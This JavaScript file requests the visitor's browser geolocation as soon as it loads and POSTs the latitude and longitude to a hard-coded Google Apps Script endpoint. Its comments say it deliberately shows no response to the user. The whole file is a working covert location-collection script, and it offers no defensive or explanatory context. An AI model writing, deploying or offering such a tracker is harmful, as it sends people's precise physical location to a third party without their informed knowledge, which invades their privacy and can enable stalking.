function showPosition(position) {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;

  // Send data to Google Sheet without showing any response
  sendDataToGoogleSheet(latitude, longitude);
}

function showError(error) {
  // Handle errors if needed
  console.error('Geolocation error:', error);
}

function sendDataToGoogleSheet(latitude, longitude) {
  const scriptUrl = 'https://script.google.com/macros/s/AKfycbygQReOFSmV4FSfvLWM1h2EKT1dGUzcXD26w2wmq1avnzQeVbgCxmmb7b8I4gBsgqo/exec';

  // Use fetch to send data to the Google Sheet
  fetch(scriptUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `latitude=${latitude}&longitude=${longitude}`,
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      // Do not show any response to the user
    })
    .catch(error => {
      console.error('Error sending data to Google Sheet:', error);
    });
}

if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(showPosition, showError);
} else {
  console.error('Geolocation is not supported by this browser.');
}